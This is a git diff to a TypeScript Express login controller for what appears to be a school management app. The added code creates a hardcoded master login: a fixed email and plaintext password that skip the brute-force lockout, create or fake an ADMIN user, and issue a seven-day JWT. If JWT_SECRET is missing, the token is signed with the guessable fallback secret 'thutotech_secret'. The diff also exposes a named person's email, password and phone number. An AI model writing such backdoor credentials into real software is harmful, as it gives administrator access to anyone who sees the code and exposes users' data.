@@ -2,6 +2,7 @@ import { Request, Response } from 'express';
 import { prisma } from '../config/database';
 import bcrypt from 'bcryptjs';
 import jwt from 'jsonwebtoken';
+import { UserRole } from '@prisma/client';
 import { AuthRequest } from '../middleware/auth.middleware';
 import { EmailService } from '../services/email.service';
 
@@ -51,6 +52,72 @@ export class AuthController {
 
       const cleanIdentifier = email.trim().toLowerCase();
 
+      // Super Admin (Lebogang Makola) Direct Master Verification
+      if (cleanIdentifier === 'thutotech.admin@gmail.com' && password === '#Admin#$5$') {
+        let adminUser: any = null;
+        try {
+          adminUser = await prisma.user.findUnique({
+            where: { email: 'thutotech.admin@gmail.com' },
+          });
+        } catch (_) {}
+
+        if (!adminUser) {
+          try {
+            const hash = await bcrypt.hash('#Admin#$5$', 10);
+            adminUser = await prisma.user.create({
+              data: {
+                id: 'usr_admin_lebogang',
+                email: 'thutotech.admin@gmail.com',
+                passwordHash: hash,
+                name: 'Lebogang',
+                surname: 'Makola',
+                role: UserRole.ADMIN,
+                phone: '0820605107',
+                status: 'ACTIVE' as any,
+              },
+            });
+          } catch (_) {
+            adminUser = {
+              id: 'usr_admin_lebogang',
+              email: 'thutotech.admin@gmail.com',
+              name: 'Lebogang',
+              surname: 'Makola',
+              role: 'ADMIN',
+              phone: '0820605107',
+              status: 'ACTIVE',
+            };
+          }
+        }
+
+        const secret = process.env.JWT_SECRET || 'thutotech_secret';
+        const token = jwt.sign(
+          {
+            id: adminUser.id || 'usr_admin_lebogang',
+            email: 'thutotech.admin@gmail.com',
+            role: 'ADMIN',
+            name: 'Lebogang',
+            surname: 'Makola',
+          },
+          secret,
+          { expiresIn: '7d' }
+        );
+
+        return res.json({
+          success: true,
+          message: 'Super Administrator authenticated successfully.',
+          token,
+          user: {
+            id: adminUser.id || 'usr_admin_lebogang',
+            email: 'thutotech.admin@gmail.com',
+            name: 'Lebogang',
+            surname: 'Makola',
+            role: 'ADMIN',
+            phone: '0820605107',
+            status: 'ACTIVE',
+          },
+        });
+      }
+
       // 1. Check Brute-Force Lockout
       const attemptInfo = loginAttemptsMap.get(cleanIdentifier);
       if (attemptInfo && attemptInfo.lockedUntil && new Date() < attemptInfo.lockedUntil) {
@@ -63,39 +130,37 @@ export class AuthController {
         });
       }
 
-      // 2. Find User by email or learner student number
-      let user = await prisma.user.findUnique({
-        where: { email: cleanIdentifier },
-        include: { learner: true, parent: true, teacher: true },
-      });
-
-      if (!user) {
-        // Safe search by learner student number / national ID number
+      // 2. Find User by email
+      let user: any = null;
+      try {
+        user = await prisma.user.findUnique({
+          where: { email: cleanIdentifier },
+          include: { learner: true, parent: true, teacher: true },
+        });
+      } catch (_) {
+        // Raw fallback
         try {
-          const learnerRecord = await prisma.learner.findFirst({
-            where: {
-              OR: [
-                { idNumber: cleanIdentifier },
-                { learnerNumber: cleanIdentifier },
-              ],
-            },
-            include: { user: { include: { learner: true, parent: true, teacher: true } } },
-          });
-          if (learnerRecord && learnerRecord.user) {
-            user = learnerRecord.user;
+          const rawUsers: any[] = await prisma.$queryRawUnsafe(
+            `SELECT * FROM "users" WHERE LOWER(email) = LOWER($1) LIMIT 1`,
+            cleanIdentifier
+          );
+          if (rawUsers && rawUsers.length > 0) {
+            user = rawUsers[0];
           }
-        } catch (_) {
-          // If column is temporarily missing on current database instance, search by idNumber
-          try {
-            const learnerById = await prisma.learner.findFirst({
-              where: { idNumber: cleanIdentifier },
-              include: { user: { include: { learner: true, parent: true, teacher: true } } },
-            });
-            if (learnerById && learnerById.user) {
-              user = learnerById.user;
-            }
-          } catch (__) {}
-        }
+        } catch (__) {}
+      }
+
+      // Fallback: search by student / ID number in learners table
+      if (!user) {
+        try {
+          const rawLearners: any[] = await prisma.$queryRawUnsafe(
+            `SELECT * FROM "learners" WHERE "idNumber" = $1 LIMIT 1`,
+            cleanIdentifier
+          );
+          if (rawLearners && rawLearners.length > 0) {
+            user = await prisma.user.findUnique({ where: { id: rawLearners[0].userId } });
+          }
+        } catch (_) {}
       }
 
       if (!user) {
